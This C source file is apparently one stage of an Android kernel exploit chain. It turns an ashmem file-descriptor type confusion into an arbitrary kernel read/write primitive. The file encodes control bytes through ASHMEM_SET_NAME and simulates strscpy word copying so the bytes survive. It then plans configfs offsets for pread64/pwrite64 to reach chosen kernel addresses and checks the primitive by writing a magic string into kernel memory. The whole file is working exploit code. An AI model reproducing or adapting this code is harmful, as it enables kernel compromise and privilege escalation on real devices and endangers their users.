/*
 * Implements the initial kernel read/write primitive through an ashmem
 * file-descriptor type confusion. Encodes control bytes with ASHMEM_SET_NAME
 * and uses positioned I/O to access target addresses.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#include "04_fake_kernel_objects.h"
#include "08_ashmem_configfs_rw.h"
#include "90_diagnostic_checkpoint.h"
#include "target.h"

#define OSS_ASHMEM_OPEN_FLAGS (O_RDWR | O_CLOEXEC)

_Static_assert(TARGET_CONFIGFS_COUNT <= INT64_MAX,
               "configfs read position must fit off_t");

static char g_ashmem_path[TARGET_ASHMEM_PATH_SIZE] = "/dev/ashmem";
static int g_ashmem_path_state;

static int select_openable_ashmem_path(const char *path) {
  int fd = open(path, OSS_ASHMEM_OPEN_FLAGS);
  if (fd < 0) {
    return 0;
  }
  close(fd);
  snprintf(g_ashmem_path, sizeof(g_ashmem_path), "%s", path);
  return 1;
}

int oss_prepare_kernel_rw_path(void) {
  if (g_ashmem_path_state != 0) {
    return g_ashmem_path_state > 0;
  }

  char boot_id[0x80];
  int boot_fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (boot_fd >= 0) {
    ssize_t n = read(boot_fd, boot_id, sizeof(boot_id) - 1);
    close(boot_fd);
    if (n > 0) {
      boot_id[n] = '\0';
      boot_id[strcspn(boot_id, "\r\n")] = '\0';
      char candidate[TARGET_ASHMEM_PATH_SIZE];
      snprintf(candidate, sizeof(candidate), "/dev/ashmem%s", boot_id);
      if (select_openable_ashmem_path(candidate)) {
        g_ashmem_path_state = 1;
        return 1;
      }
    }
  }

  struct stat canonical;
  int canonical_ok = stat("/dev/ashmem", &canonical) == 0;
  DIR *dev = opendir("/dev");
  if (canonical_ok && dev && S_ISCHR(canonical.st_mode)) {
    struct dirent *entry;
    while ((entry = readdir(dev)) != NULL) {
      if (strncmp(entry->d_name, "ashmem", 6) != 0 ||
          strcmp(entry->d_name, "ashmem") == 0) {
        continue;
      }
      char candidate[TARGET_ASHMEM_PATH_SIZE];
      snprintf(candidate, sizeof(candidate), "/dev/%s", entry->d_name);
      struct stat alias;
      if (stat(candidate, &alias) == 0 && S_ISCHR(alias.st_mode) &&
          alias.st_rdev == canonical.st_rdev &&
          select_openable_ashmem_path(candidate)) {
        closedir(dev);
        g_ashmem_path_state = 1;
        return 1;
      }
    }
  }
  if (dev) {
    closedir(dev);
  }

  if (canonical_ok && S_ISCHR(canonical.st_mode) &&
      select_openable_ashmem_path("/dev/ashmem")) {
    g_ashmem_path_state = 1;
    return 1;
  }

  g_ashmem_path_state = -1;
  return 0;
}

int oss_open_kernel_rw(void) {
  if (!oss_prepare_kernel_rw_path()) {
    fprintf(stderr, "[aar_aaw] no openable ashmem node\n");
    return -1;
  }
  errno = 0;
  int fd = open(g_ashmem_path, OSS_ASHMEM_OPEN_FLAGS);
  if (fd < 0) {
    int saved_errno = errno;
    fprintf(stderr, "[aar_aaw] open(%s) failed errno=%d(%s)\n",
            g_ashmem_path, saved_errno, strerror(saved_errno));
  }
  return fd;
}

static int set_name_prefix(int fd, const unsigned char *src, size_t len) {
  if (len >= TARGET_ASHMEM_NAME_LEN) {
    errno = EINVAL;
    return -1;
  }
  unsigned char name[TARGET_ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) {
    name[i] = src[i] < 2 ? 1 : src[i];
  }
  name[len] = 0;
  return ioctl(fd, TARGET_ASHMEM_SET_NAME_IOCTL, name);
}

static int set_ashmem_name_blob(int fd, const unsigned char *src, size_t len) {
  if (set_name_prefix(fd, src, len) != 0) {
    return -1;
  }
  for (size_t i = len; i > 0; i--) {
    if (src[i - 1] == 0 && set_name_prefix(fd, src, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* The selected target's strscpy() loads and stores whole target words. When a word contains
 * NUL it stores the bytes through NUL and zeroes the rest of that word. The
 * later words retain their previous contents. ASHMEM_SET_NAME always gives
 * strscpy() a 256-byte limit, so even short prefixes take this word path. */
static void simulate_set_name_prefix(unsigned char *destination,
                                     size_t destination_len,
                                     const unsigned char *source,
                                     size_t prefix_len) {
  size_t copied = prefix_len < destination_len ? prefix_len : destination_len;
  for (size_t i = 0; i < copied; i++) {
    destination[i] = source[i] < 2 ? 1 : source[i];
  }
  if (prefix_len < destination_len) {
    size_t word_end =
        (prefix_len + TARGET_STRSCPY_WORD_SIZE) &
        ~(size_t)(TARGET_STRSCPY_WORD_SIZE - 1);
    if (word_end > destination_len) {
      word_end = destination_len;
    }
    memset(destination + prefix_len, 0, word_end - prefix_len);
  }
}

static void simulate_ashmem_name_blob(const unsigned char *source, size_t len,
                                      unsigned char *encoded) {
  memset(encoded, 0xa5, len);
  simulate_set_name_prefix(encoded, len, source, len);
  for (size_t i = len; i > 0; i--) {
    if (source[i - 1] == 0) {
      simulate_set_name_prefix(encoded, len, source, i - 1);
    }
  }
}

static int control_range_survives(const unsigned char *control,
                                  const unsigned char *encoded,
                                  size_t offset, size_t len) {
  return offset <= TARGET_CONFIGFS_CONTROL_LEN &&
         len <= TARGET_CONFIGFS_CONTROL_LEN - offset &&
         memcmp(control + offset, encoded + offset, len) == 0;
}

static int read_control_survives_strscpy(
    const unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
  unsigned char encoded[TARGET_CONFIGFS_CONTROL_LEN];
  simulate_ashmem_name_blob(control, sizeof(encoded), encoded);
  return control_range_survives(control, encoded,
                                TARGET_CONFIGFS_PAGE_CONTROL_OFF,
                                sizeof(uint64_t)) &&
         control_range_survives(control, encoded,
                                TARGET_CONFIGFS_READ_STATE_OFF,
                                TARGET_CONFIGFS_READ_STATE_LEN);
}

static int write_control_survives_strscpy(
    const unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
  unsigned char encoded[TARGET_CONFIGFS_CONTROL_LEN];
  simulate_ashmem_name_blob(control, sizeof(encoded), encoded);
  return control_range_survives(control, encoded,
                                TARGET_CONFIGFS_WRITE_STATE_OFF,
                                TARGET_CONFIGFS_WRITE_STATE_LEN);
}

struct configfs_read_plan {
  uint64_t page;
  uint64_t offset;
  uint64_t kernel_check_len;
};

static int make_configfs_read_plan(uint64_t target_addr, size_t len,
                                   struct configfs_read_plan *plan) {
  if (!plan || len == 0 || len >= TARGET_CONFIGFS_COUNT || len > SSIZE_MAX ||
      target_addr > UINT64_MAX - (len - 1)) {
    errno = EOVERFLOW;
    return 0;
  }

  plan->offset = TARGET_CONFIGFS_COUNT - len;
  plan->page = target_addr - plan->offset;
  plan->kernel_check_len = TARGET_CONFIGFS_COUNT - plan->offset;

  if (plan->offset > INT64_MAX ||
      plan->page + plan->offset != target_addr ||
      plan->kernel_check_len != len) {
    errno = EOVERFLOW;
    return 0;
  }
  return 1;
}

static int prepare_configfs_read_control(
    uint64_t target_addr, size_t len, struct configfs_read_plan *plan,
    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
  if (!make_configfs_read_plan(target_addr, len, plan)) {
    return 0;
  }
  memset(control, 1, TARGET_CONFIGFS_CONTROL_LEN);
  memcpy(control + TARGET_CONFIGFS_PAGE_CONTROL_OFF, &plan->page,
         sizeof(plan->page));
  memset(control + TARGET_CONFIGFS_READ_STATE_OFF, 0,
         TARGET_CONFIGFS_READ_ZERO_LEN);
  if (!read_control_survives_strscpy(control)) {
    errno = EILSEQ;
    return 0;
  }
  return 1;
}

/* configfs writes to bin_buffer + ki_pos. The old encoder fixed ki_pos to the
 * low 24 address bits, but that is only one member of an equivalence class:
 * adding 2^24 to ki_pos and subtracting it from bin_buffer preserves the exact
 * destination while changing the bytes that must survive strscpy(). */
struct configfs_write_plan {
  uint64_t pos;
  uint32_t size;
};

#define CONFIGFS_WRITE_POS_STEP (TARGET_CONFIGFS_ADDR_LOW_MASK + 1ULL)
#define CONFIGFS_WRITE_SIZE_SLACK 0x200U

static int build_configfs_write_control(
    uint64_t target_addr, uint64_t pos, uint32_t size,
    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
  uint64_t bin_buffer = target_addr - pos;
  uint32_t zero = 0;
  memset(control, 1, TARGET_CONFIGFS_CONTROL_LEN);
  memset(control + TARGET_CONFIGFS_WRITE_STATE_OFF, 0,
         TARGET_CONFIGFS_WRITE_ZERO_LEN);
  memcpy(control + TARGET_CONFIGFS_WRITE_HIGH_OFF, &bin_buffer,
         sizeof(bin_buffer));
  memcpy(control + TARGET_CONFIGFS_WRITE_END_OFF, &size, sizeof(size));
  memcpy(control + TARGET_CONFIGFS_WRITE_ZERO_OFF, &zero, sizeof(zero));
  return write_control_survives_strscpy(control);
}

static int prepare_configfs_write_control(
    uint64_t target_addr, size_t len, struct configfs_write_plan *plan,
    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
  if (!plan || len == 0 || len > INT32_MAX ||
      target_addr > UINT64_MAX - (len - 1)) {
    errno = EOVERFLOW;
    return 0;
  }

  /* Search every non-negative position congruent to the original low field
   * that can still fit in configfs_buffer.bin_buffer_size (a signed int in the
   * target binary). The common legacy plan is tried first and remains unchanged.
   * A small size slack changes otherwise destructive NUL bytes without
   * changing the bounded copy length. */
  uint64_t low = target_addr & TARGET_CONFIGFS_ADDR_LOW_MASK;
  for (uint64_t pos = low; pos <= target_addr;) {
    uint64_t minimum_size = pos + len;
    if (minimum_size > INT32_MAX) {
      break;
    }
    for (uint32_t slack = 0; slack <= CONFIGFS_WRITE_SIZE_SLACK; slack++) {
      uint64_t size = minimum_size + slack;
      if (size > INT32_MAX) {
        break;
      }
      if (build_configfs_write_control(target_addr, pos, (uint32_t)size,
                                       control)) {
        plan->pos = pos;
        plan->size = (uint32_t)size;
        return 1;
      }
    }
    if (pos > INT32_MAX - CONFIGFS_WRITE_POS_STEP) {
      break;
    }
    pos += CONFIGFS_WRITE_POS_STEP;
  }
  errno = EILSEQ;
  return 0;
}

int oss_kernel_read_plan_supported(uint64_t target_addr, size_t len) {
  struct configfs_read_plan plan;
  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
  return prepare_configfs_read_control(target_addr, len, &plan, control);
}

int oss_kernel_write_plan_supported(uint64_t target_addr, size_t len) {
  struct configfs_write_plan plan;
  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
  return prepare_configfs_write_control(target_addr, len, &plan, control);
}

int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
  struct configfs_read_plan plan;
  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
  if (!buf ||
      !prepare_configfs_read_control(target_addr, len, &plan, control)) {
    fprintf(stderr,
            "[aar_aaw] unsafe read plan rejected fd=%d addr=%016llx len=%zu "
            "errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, errno, strerror(errno));
    return 0;
  }

  errno = 0;
  if (set_ashmem_name_blob(fd, control, sizeof(control)) != 0) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] configure read(fd=%d, addr=%016llx, len=%zu) failed "
            "errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, saved_errno,
            strerror(saved_errno));
    return 0;
  }

  errno = 0;
  ssize_t n = pread64(fd, buf, len, (off_t)plan.offset);
  if (n != (ssize_t)len) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] pread64(fd=%d, addr=%016llx, len=%zu) ret=%zd errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, n, saved_errno,
            strerror(saved_errno));
    return 0;
  }
  return 1;
}

int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                      size_t len) {
  struct configfs_write_plan plan;
  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
  if (!buf ||
      !prepare_configfs_write_control(target_addr, len, &plan, control)) {
    fprintf(stderr,
            "[aar_aaw] unsafe write plan rejected fd=%d addr=%016llx len=%zu "
            "errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, errno, strerror(errno));
    return 0;
  }
  errno = 0;
  if (set_ashmem_name_blob(fd, control, sizeof(control)) != 0) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] configure write(fd=%d, addr=%016llx, len=%zu) failed "
            "errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, saved_errno,
            strerror(saved_errno));
    return 0;
  }

  errno = 0;
  ssize_t n = pwrite64(fd, buf, len, (off_t)plan.pos);
  if (n != (ssize_t)len) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] pwrite64(fd=%d, addr=%016llx, len=%zu) ret=%zd errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, n, saved_errno,
            strerror(saved_errno));
    return 0;
  }
  return 1;
}

uint64_t oss_kernel_read64(int fd, uint64_t target_addr) {
  uint64_t value = 0xffffffffffffffffULL;
  if (!oss_kernel_read(fd, target_addr, &value, sizeof(value))) {
    return 0xffffffffffffffffULL;
  }
  return value;
}

int oss_kernel_write64(int fd, uint64_t target_addr, uint64_t value) {
  return oss_kernel_write(fd, target_addr, &value, sizeof(value));
}

int oss_verify_kernel_access_plan_supported(uint64_t ashmem_misc_fops_addr,
                                            uint64_t page_base) {
  static const char magic[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  uint64_t scratch = page_base | TARGET_CONFIGFS_SCRATCH_LIVE_OFF;
  return oss_kernel_read_plan_supported(ashmem_misc_fops_addr,
                                        sizeof(uint64_t)) &&
         oss_kernel_write_plan_supported(scratch, sizeof(magic)) &&
         oss_kernel_read_plan_supported(scratch, sizeof(magic));
}

int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                uint64_t page_base, int *landed) {
  oss_diag_checkpoint("aar-verify-start");
  uint64_t expect = page_base | TARGET_PRIMARY_FOPS_LIVE_OFF;
  uint64_t got = UINT64_MAX;
  if (!oss_kernel_read(fd, ashmem_misc_fops_addr, &got, sizeof(got))) {
    return 0;
  }

  if (landed) {
    __atomic_store_n(landed, 1, __ATOMIC_RELEASE);
  }
  fprintf(stderr,
          "[aar_aaw] ashmem_misc_fops readback got=%016llx want=%016llx\n",
          (unsigned long long)got, (unsigned long long)expect);
  if (got != expect) {
    char stage[96];
    snprintf(stage, sizeof(stage), "aar-fops-mismatch got=%016llx want=%016llx",
             (unsigned long long)got, (unsigned long long)expect);
    oss_diag_checkpoint(stage);
    return 0;
  }
  oss_diag_checkpoint("aar-fops-verified");

  static const char magic[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  uint64_t scratch = page_base | TARGET_CONFIGFS_SCRATCH_LIVE_OFF;
  if (!oss_kernel_write(fd, scratch, magic, sizeof(magic))) {
    fprintf(stderr, "[aar_aaw] magic-string write failed\n");
    return 0;
  }
  oss_diag_checkpoint("aar-magic-written");
  char readback[sizeof(magic)];
  memset(readback, 0, sizeof(readback));
  if (!oss_kernel_read(fd, scratch, readback, sizeof(magic))) {
    fprintf(stderr, "[aar_aaw] magic-string readback failed\n");
    return 0;
  }
  oss_diag_checkpoint("aar-magic-read");
  if (memcmp(magic, readback, sizeof(magic)) != 0) {
    uint64_t got_prefix = 0, want_prefix = 0;
    memcpy(&got_prefix, readback, sizeof(got_prefix));
    memcpy(&want_prefix, magic, sizeof(want_prefix));
    char stage[96];
    snprintf(stage, sizeof(stage), "aar-magic-mismatch got=%016llx want=%016llx",
             (unsigned long long)got_prefix, (unsigned long long)want_prefix);
    oss_diag_checkpoint(stage);
    fprintf(stderr,
            "[aar_aaw] magic-string mismatch addr=%016llx "
            "got=%016llx want=%016llx\n",
            (unsigned long long)scratch, (unsigned long long)got_prefix,
            (unsigned long long)want_prefix);
    return 0;
  }
  fprintf(stderr, "[aar_aaw] verify ok: corruption landed, R/W primitive live\n");
  return 1;
}

int oss_verify_kernel_access(int fd, uint64_t ashmem_misc_fops_addr,
                             uint64_t page_base) {
  return oss_verify_kernel_access_ex(fd, ashmem_misc_fops_addr, page_base,
                                     NULL);
}
